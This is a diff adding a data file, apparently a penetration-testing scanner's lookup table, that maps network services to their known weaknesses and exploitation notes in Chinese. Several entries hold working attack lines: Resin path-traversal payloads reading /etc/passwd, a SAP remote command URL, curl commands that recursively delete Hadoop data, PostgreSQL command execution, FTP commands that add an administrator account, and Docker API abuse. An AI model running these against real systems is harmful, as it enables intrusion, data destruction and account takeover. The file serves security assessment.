@@ -1,0 +1,67 @@
+tomcat|Tomcat\n漏洞: 弱口令、示例目录\n利用：通过弱口令登录控制台，上传war包。
+jboss|Jboss\n漏洞: 未授权访问、反序列化\n利用：\n1、未授权访问控制台，远程部署木马\n2、反序列化导致远程命令执行等。\n检测工具：https://github.com/joaomatosf/jexboss
+resin|resin\n漏洞: 目录遍历、远程文件读取\n利用：通过目录遍历/远程文件读取获取敏感信息，为进一步攻击提供必要的信息。任意文件读取\nPOC:\npayload1 = /resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=/etc/passwd\npayload2 = /resin-doc/examples/jndi-appconfig/test?inputFile=../../../../../../../../../../etc/passwd\npayload3 = / ..\\\\\\\\web-inf
+jetty|Jetty\n漏洞: 远程共享缓冲区泄漏\n利用：通过构造headers值来触发异常并偏移到共享缓冲区，其中包含了之前其他用户提交的请求，服务器会根据payload返回特定位置的数据。\n检测工具：https://github.com/GDSSecurity/Jetleak-Testing-Script
+glassfish|GlassFish\n漏洞: 弱口令、任意文件读取\n利用：\n1、弱口令 admin/admin，直接部署shell\n2、任意文件读取获取服务器敏感配置信息
+jenkins|Jenkins\n漏洞: 未授权访问、远程代码执行\n利用：访问如下url，可以执行脚本命令，反弹shell，写入webshell等。\nhttp://ip:8080/manage\nhttp://ip:8080/script
+activemq|ActiveMQ\n漏洞: 弱口令、任意文件写入、反序列化\n利用：默认密码admin/admin登陆控制台,写入webshell、上传ssh key等方式
+websphere|WebSphere\n漏洞: 控制台弱口令、远程代码执行\n后台地址：https://ip:9043/ibm/console/logon.jsp
+sap|SAP\n漏洞: 远程代码执行\n利用：攻击者通过构造url请求，实现远程代码执行。\nPOC:http://:50000/ctc/servlet/com.sap.ctc.util.ConfigServlet?param=com.sap.ctc.util.FileSystemConfig;EXECUTE_CMD;CMDLINE=cmd.exe /c ipconfig /all
+hadoop|Hadoop\n漏洞: 未授权访问\n利用：攻击者可以通过命令行操作多个目录下的数据，如进行删除操作。\ncurl -i -X DELETE \"http://ip:50070/webhdfs/v1/tmp?op=DELETE&recursive=true\"\ncurl -i -X PUT \"http://ip:50070/webhdfs/v1/NODATA4U_SECUREYOURSHIT?op=MKDIRS\"
+CouchDB|CouchDB\n漏洞: 垂直权限绕过、任意命令执行\n利用：通过构造数据创建管理员用户，使用管理员用户登录，构造恶意请求触发任意命令执行。\n后台访问：http://:5984/_utils
+elasticsearch|elasticsearch\n漏洞: 未授权访问、命令执行\n检测方式：\n1、直接访问如下url，获取相关敏感信息。\n\thttp://:9200/_nodes\t查看节点数据\n\thttp://:9200/_river\t查看数据库敏感信息\n2、通过构造特定的数据包，执行任意命令。
+MemCache|MeMCache\n漏洞: 未授权访问\n检测方式：无需用户名密码，可以直接连接 memcache 服务的 11211 端口。\nnc -vv <target> 11211
+ntp|漏洞: ntpdc -n -c monlist x.x.x.x 或 Ver 4.2.7p26
+ssh|漏洞: 暴力破解 或 用户枚举(OpenSSH 7.7及其以前版本 - CVE-2018-15473)\n利用方式: metasploit-ssh_enumusers
+telnet|漏洞: 暴力破解 或 明文传输
+ms-wbt-server|漏洞: 暴力破解
+pc-anywhere|漏洞: 暴力破解\n利用: nmap pcanywhere-brute
+vnc|漏洞: 暴力破解
+java-rmi|漏洞: Java RMI\n检测工具: attackRMI.jar
+weblogic|漏洞: 弱口令、SSRF、反序列化漏洞\n利用：\n1、控制台弱口令上传war木马\n2、SSRF内网探测\n3、反序列化远程代码执行等
+jdwp|漏洞: 远程命令执行 8000 java Debug Wire Protocol\n检测工具：https://github.com/IOActive/jdwp-shellifier
+ldap|漏洞: 未授权访问、弱口令\n利用：通过LdapBrowser工具直接连入。
+ms-sql-s|漏洞: 弱口令、暴力破解\n利用：差异备份getshell、SA账户提权等
+oracle-tns|漏洞: 暴力破解\n利用：通过弱口令/暴力破解进行入侵。
+mysql|漏洞: 暴力破解\n利用：利用日志写入webshell、udf提权、mof提权等
+postgresql|漏洞: 弱口令、高权限命令执行\n利用：弱口令获取账号信息，连入postgres中，可执行系统命令\nPoC参考：\nDROP TABLE IF EXISTS cmd_exec;\nCREATE TABLE cmd_exec(cmd_output text);\nCOPY cmd_exec FROM PROGRAM 'id';\nSELECT * FROM cmd_exec;
+redis|漏洞: 未授权访问\n利用：绝对路径写 webshell 、利用计划任务执行命令反弹 shell、公私钥认证获取 root 权限、主从复制 RCE 等。
+mongodb|未漏洞: 授权访问/弱口令\n利用：未授权访问/弱口令，远程连入数据库，导致敏感信息泄露。
+ftp|漏洞: 配置不当/明文传输/第三方软件提权\n利用：\n1、匿名登录或弱口令 \n2、嗅探 ftp 用户名和密码 \n3、Serv-U 权限较大的账号可导致系统命令执行。FTP 提权命令：\n\t# 增加系统用户\n\t\tQuote site exec net user 4567 4567 /add\n\t# 提升到管理员权限\n\t\tQuote site exec net localgroup administrators 4567 /add\n4、vsftp2.3.4 微笑后门
+smtp|漏洞:1、匿名发送邮件 2、弱口令 3、SMTP 用户枚举\n利用：\n1、SMTP 服务器配置不当，攻击者可以使用任意用户发送邮件。\n2、SMTP 弱口令扫描，获取用户账号密码，发送邮件钓鱼。\n3、通过 SMTP 用户枚举获取用户名：\n\tnmap --script smtp-enum-users -p 25 target
+domain|漏洞: 1、DNS 域传送漏洞、DNS 欺骗、DNS 缓存投毒\n检测方式：\n1、DNS 域传送漏洞，Windows 下检测使用 nslookup 命令，Linux 下检测使用 dig 命令，通过执行命令可以清楚的看到域名解析情况。\n2、DNS 欺骗就是攻击者冒充域名服务器的一种欺骗行为。\n3、DNS 缓存投毒是攻击者欺骗 DNS 服务器相信伪造的 DNS 响应的真实性。
+snmp|漏洞: 默认团体名/弱口令访问\n利用：通过nmap自带的审计脚本进行检测，可能导致敏感信息泄露\n1、弱口令检测：nmap -sU -p161 --script snmp-brute target\n2、获取系统信息：nmap -sU -p161 --script snmp-sysdescr target\n3、获取用户信息：nmap -sU -p161 --script snmp-win32-user target\n4、获取网络端口状态：nmap -sU -p161 --script snmp-netstat target\n5、默认团体名检测：snmpwalk -v 1 -c public xx.xx.xx.xx
+https|漏洞: OpenSSL 心脏出血\n利用：攻击者可以远程读取存在漏洞版本的 openssl 服务器内存中长大 64K 的数据。\n扫描脚本：nmap -sV --script=ssl-heartbleed <target>
+microsoft-ds|漏洞: 信息泄露、远程代码执行\n利用：可利用共享获取敏感信息、缓冲区溢出导致远程代码执行，如 ms17010。
+rsync|漏洞: 匿名访问、弱口令\n利用：攻击者可以执行下载/上传等操作，也可以尝试上传webshell。\n1、下载：rsync -avz a.b.c.d::path/file path/filiname\n2、上传：rsync -avz path/filename a.b.c.d::path/file
+zookeeper|漏洞: 未授权\n利用：echo envi 或 nc ip port
+docker|漏洞: 未授权\n利用：通过docker daemon api执行docker命令。\n#列出容器信息，\ncurl http://xx:2375/containers/json\ndocker -H tcp://xx:2375 start <Container Id>
+ajp13|漏洞: 文件读取/包含,CNVD-2020-10487-Tomcat-ajp-POC
+oracle|漏洞: 暴力破解
+ssl/ntp|漏洞: ntpdc -n -c monlist x.x.x.x 或 Ver 4.2.7p26
+ssl/ssh|漏洞: 暴力破解 或 用户枚举(OpenSSH 7.7及其以前版本 - CVE-2018-15473)\n利用方式: metasploit-ssh_enumusers
+ssl/telnet|漏洞: 暴力破解 或 明文传输
+ssl/ms-wbt-server|漏洞: 暴力破解
+ssl/pc-anywhere|漏洞: 暴力破解
+ssl/vnc|漏洞: 暴力破解
+ssl/java-rmi|漏洞: Java RMI\n检测工具: attackRMI.jar
+ssl/weblogic|漏洞: 弱口令、SSRF、反序列化漏洞\n利用：\n1、控制台弱口令上传war木马\n2、SSRF内网探测\n3、反序列化远程代码执行等
+ssl/jdwp|漏洞: 远程命令执行 8000 java Debug Wire Protocol\n检测工具：https://github.com/IOActive/jdwp-shellifier
+ssl/ldap|漏洞: 未授权访问、弱口令\n利用：通过LdapBrowser工具直接连入。
+ssl/ms-sql-s|漏洞: 弱口令、暴力破解\n利用：差异备份getshell、SA账户提权等
+ssl/oracle-tns|漏洞: 暴力破解\n利用：通过弱口令/暴力破解进行入侵。
+ssl/mysql|漏洞: 暴力破解\n利用：利用日志写入webshell、udf提权、mof提权等
+ssl/postgresql|漏洞: 弱口令、高权限命令执行\n利用：弱口令获取账号信息，连入postgres中，可执行系统命令\nPoC参考：\nDROP TABLE IF EXISTS cmd_exec;\nCREATE TABLE cmd_exec(cmd_output text);\nCOPY cmd_exec FROM PROGRAM 'id';\nSELECT * FROM cmd_exec;
+ssl/redis|漏洞: 未授权访问\n利用：绝对路径写 webshell 、利用计划任务执行命令反弹 shell、公私钥认证获取 root 权限、主从复制 RCE 等。
+ssl/mongodb|未漏洞: 授权访问/弱口令\n利用：未授权访问/弱口令，远程连入数据库，导致敏感信息泄露。
+ssl/ftp|漏洞: 配置不当/明文传输/第三方软件提权\n利用：\n1、匿名登录或弱口令 \n2、嗅探 ftp 用户名和密码 \n3、Serv-U 权限较大的账号可导致系统命令执行。FTP 提权命令：\n\t# 增加系统用户\n\t\tQuote site exec net user 4567 4567 /add\n\t# 提升到管理员权限\n\t\tQuote site exec net localgroup administrators 4567 /add
+ssl/smtp|漏洞:1、匿名发送邮件 2、弱口令 3、SMTP 用户枚举\n利用：\n1、SMTP 服务器配置不当，攻击者可以使用任意用户发送邮件。\n2、SMTP 弱口令扫描，获取用户账号密码，发送邮件钓鱼。\n3、通过 SMTP 用户枚举获取用户名：\n\tnmap --script smtp-enum-users -p 25 target
+ssl/domain|漏洞: 1、DNS 域传送漏洞、DNS 欺骗、DNS 缓存投毒\n检测方式：\n1、DNS 域传送漏洞，Windows 下检测使用 nslookup 命令，Linux 下检测使用 dig 命令，通过执行命令可以清楚的看到域名解析情况。\n2、DNS 欺骗就是攻击者冒充域名服务器的一种欺骗行为。\n3、DNS 缓存投毒是攻击者欺骗 DNS 服务器相信伪造的 DNS 响应的真实性。
+ssl/snmp|漏洞: 默认团体名/弱口令访问\n利用：通过nmap自带的审计脚本进行检测，可能导致敏感信息泄露\n1、弱口令检测：nmap -sU -p161 --script snmp-brute target\n2、获取系统信息：nmap -sU -p161 --script snmp-sysdescr target\n3、获取用户信息：nmap -sU -p161 --script snmp-win32-user target\n4、获取网络端口状态：nmap -sU -p161 --script snmp-netstat target\n5、默认团体名检测：snmpwalk -v 1 -c public xx.xx.xx.xx
+ssl/https|漏洞: OpenSSL 心脏出血\n利用：攻击者可以远程读取存在漏洞版本的 openssl 服务器内存中长大 64K 的数据。\n扫描脚本：nmap -sV --script=ssl-heartbleed <target>
+ssl/microsoft-ds|漏洞: 信息泄露、远程代码执行\n利用：可利用共享获取敏感信息、缓冲区溢出导致远程代码执行，如 ms17010。
+ssl/rsync|漏洞: 匿名访问、弱口令\n利用：攻击者可以执行下载/上传等操作，也可以尝试上传webshell。\n1、下载：rsync -avz a.b.c.d::path/file path/filiname\n2、上传：rsync -avz path/filename a.b.c.d::path/file
+ssl/zookeeper|漏洞: 未授权\n利用：echo envi 或 nc ip port
+ssl/docker|漏洞: 未授权\n利用：通过docker daemon api执行docker命令。\n#列出容器信息，\ncurl http://xx:2375/containers/json\ndocker -H tcp://xx:2375 start <Container Id>
+ssl/ajp13|漏洞: 文件读取/包含,CNVD-2020-10487-Tomcat-ajp-POC
+ssl/oracle|漏洞: 暴力破解
